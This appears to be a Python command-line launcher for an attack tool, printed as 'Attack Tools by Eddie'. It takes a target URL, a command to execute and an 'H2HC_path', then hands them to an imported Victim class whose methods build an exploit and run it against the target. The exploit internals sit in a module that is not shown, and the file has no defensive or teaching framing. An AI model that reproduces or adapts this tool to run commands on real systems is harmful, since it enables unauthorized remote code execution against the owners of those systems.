from MyFunc import Victim
import sys
import getopt

#定义全局变量

H2HC_path  = ''
Command    = ''
Target_URL = ''

def usage():
    print('Attack Tools by Eddie')
    print()
    print('Usage: Attack.py -u target_url -c Command -p H2HC_path')

def main():
    global H2HC_path
    global Command
    global Target_URL

    if not len(sys.argv[1:]):
        usage()

    try:
        opts,args = getopt.getopt(sys.argv[1:],'hu:c:p:')
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o,a in opts:
        if o == '-h':
            usage()
        elif o == '-u':
            Target_URL = a
        elif o == '-c':
            Command = a
        elif o == '-p':
            H2HC_path = a
        else:
            print('Unbelievable! need more support!')

    Attack = Victim(Target_URL,Command)
    Attack.SetH2HC(H2HC_path)
    Attack.Expolit_Create()
    Attack.Attack()
